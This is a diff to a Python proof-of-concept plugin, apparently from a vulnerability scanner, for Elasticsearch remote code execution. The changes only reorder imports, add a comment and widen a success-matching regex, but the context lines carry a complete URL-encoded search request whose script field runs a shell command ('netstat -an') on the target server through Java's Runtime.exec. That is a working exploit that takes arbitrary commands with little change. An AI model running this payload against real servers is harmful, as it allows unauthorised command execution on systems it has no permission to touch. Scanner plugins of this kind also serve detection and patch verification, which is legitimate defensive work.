@@ -1,7 +1,8 @@
-from ..miniCurl import Curl
-from ..t  import T
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
+
+from ..miniCurl import Curl
+from ..t  import T
 
 """
 POC Name  :  Elasticsearch Remote Code Execution 
@@ -22,13 +23,13 @@ class P(T):
         result = {}
         result['result']=False
 
+#	execute netstat -an
         payload = arg[:-1]+"/_search?source=%7B%22size%22:1,%22query%22:%7B%22filtered%22:%7B%22query%22:%7B%22match_all%22:%7B%7D%7D%7D%7D,%22script_fields%22:%7B%22exp%22:%7B%22script%22:%22import%20java.util.*;%5Cnimport%20java.io.*;%5CnString%20str%20=%20%5C%22%5C%22;BufferedReader%20br%20=%20new%20BufferedReader(new%20InputStreamReader(Runtime.getRuntime().exec(%5C%22netstat%20-an%5C%22).getInputStream()));StringBuilder%20sb%20=%20new%20StringBuilder();while((str=br.readLine())!=null)%7Bsb.append(str);%7Dsb.toString();%22%7D%7D%7D"
         code, head, res, errcode, _ = curl.curl(payload)
         if code == 200:
-            m = re.search("ESTABLISHED",res)
+            m = re.search("ESTABLISHED|已连接",res)
             if m:
                 output(arg[:-1]+payload,result,'hole')
-    
 
         del curl
         return result
